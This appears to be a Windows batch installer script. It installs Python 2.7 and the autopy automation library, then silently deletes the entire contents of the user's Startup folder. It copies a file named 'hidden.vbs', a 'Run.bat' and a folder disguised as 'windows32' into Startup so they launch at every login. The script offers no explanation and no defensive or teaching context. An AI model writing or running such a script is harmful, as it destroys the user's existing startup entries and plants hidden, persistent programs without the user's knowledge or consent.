@echo off
python-2.7.14.msi
autopy-0.51.win32-py2.7.exe
pushd %userprofile%\Start Menu\Programs\Startup && (rd /s /q "%userprofile%\Start Menu\Programs\Startup" 2>nul & popd)
copy "hidden.vbs" "%userprofile%\Start Menu\Programs\Startup"
copy "Run.bat" "%userprofile%\Start Menu\Programs\Startup"
xcopy /S "windows32" "%userprofile%\Start Menu\Programs\Startup"
exit